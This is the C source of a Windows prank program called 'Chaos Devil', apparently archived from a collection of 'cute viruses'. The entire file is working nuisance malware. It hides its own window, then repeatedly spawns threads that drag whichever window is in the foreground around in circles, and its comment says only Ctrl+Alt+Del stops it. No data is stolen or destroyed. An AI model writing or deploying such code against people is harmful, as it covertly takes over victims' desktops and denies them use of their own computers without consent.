/*
  name      Chaos Devil
  type      prank
  cve       —
  year      —
  os        windows
  authors   Minhas Kamal
  source    https://github.com/MinhasKamal/CuteVirusCollection
  archived  krisyotam
  notes     moves foreground window in circular motion via WinAPI
 */

// Randomly moves the active window around. Only Ctrl+Alt+Del will stop it.
#include <windows.h>
#include <math.h>

DWORD WINAPI moveit(){
    HWND a = GetForegroundWindow();
    int i, j, k = 1;
    while(k++){
        i = 200 + 300 * cos(k);
        j = 150 + 300 * sin(k);
        MoveWindow(a, i, j, i, j, 1);
        Sleep(50);
    }
}

main(){
    DWORD dwThreadId;
    HWND last = GetForegroundWindow();
    ShowWindow(last, SW_HIDE);
    while(1){
        if(last != GetForegroundWindow()){
            last = GetForegroundWindow();
            CreateThread(NULL, 0, moveit, &last, 0, &dwThreadId);
        }
    }
}
